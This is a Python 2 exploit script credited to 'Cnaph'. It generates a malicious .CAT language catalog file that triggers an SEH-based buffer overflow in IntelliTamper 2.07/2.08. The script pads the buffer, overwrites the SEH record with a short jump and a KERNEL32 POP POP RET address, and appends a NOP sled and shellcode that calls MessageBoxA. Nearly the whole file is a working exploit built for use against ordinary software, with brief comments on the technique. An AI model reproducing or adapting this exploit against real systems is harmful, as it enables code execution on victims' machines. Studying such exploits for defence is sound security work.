#!usr/bin/python
# IntelliTamper (2.07/2.08) Language Catalog SEH Overflow Exploit.
    # we start off the exploitation with some fuzzing to determine how many bytes
    # before overwriting the pointer to next SEH
    # and pointer to SEH, we will try and overwrite each address with 41414141 "AAAA" [Pointer to next SEH]
    # and 42424242 "BBBB" [pointer to SEH].
   
# 0x41414141  Pointer to next SEH record
# 0x42424242  SE handler
#
# The vulnerability was discovered by 'Cnaph'. First click in "File" through your IntelliTamper and >> "Options"
# Then open your crafted file .CAT to update your Language catalog and your SEH will be overwritten.
# This exploit implements the SEH technique to exploit the issue . . .
# When doing SEH overwrites the pointer to the SEH handler is target to be overwritten,
# so we can gain control over the program.
#/Cnaph.
print "[+] IntelliTamper (2.07/2.08) Language Catalog SEH Overflow Exploit.";
Variable = "\x24\x30\x30\x30\x38\x30\x3D";
Junks =("\x41"*761)+("\x91"*19702)+(106*"\x41")
Nex_SEHHandler = "\xeb\x06\x90\x90"; # JMP
SEH_handler = "\x61\xfb\x86\x7c"; # SE.42424242 le SEH handler est ecrasé.
                         # L'addresse de déplacement de l'indicateur SEH va etre changé.
                         # KERNEL32.DLL (CALL EBX POP POP RET)
NOP_SLED = "\x90"*12
Shellcode =((("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x37\x59\x88\x51\x0a\xbb"
              "\x77\x1d\x80\x7c" #LoadlibaryA(libaryname)
              "\x51\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x0b\x51\x50\xbb"
              "\x28\xac\x80\x7c" #GetProcAddress(hmodule,functionname)
              "\xff\xd3\xeb\x39\x59\x31\xd2\x88\x51\x06\x31\xd2\x52\x51"
              "\x51\x52\xff\xd0\x31\xd2\x50\xb8\xa2\xca\x81\x7c\xff\xd0\xe8\xc4\xff"
              "\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x4e\xe8\xc2\xff\xff"
              "\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x4e\xe8\xc2\xff\xff"
              "\xff\x63\x4E\x34\x70\x68\x75\x78"))); #
Plus = "\n\n\n\n"
Seh_overwrite = Variable + Junks + Nex_SEHHandler + SEH_handler + NOP_SLED + Shellcode
genre = ".CAT";
Title = "IntelliTamper_DZ";
headers = open(Title + genre, "w")
headers.write(Seh_overwrite)
headers.close()
print "[+] Exploit file has been successfully built.";
print "\n\Cnaph.";

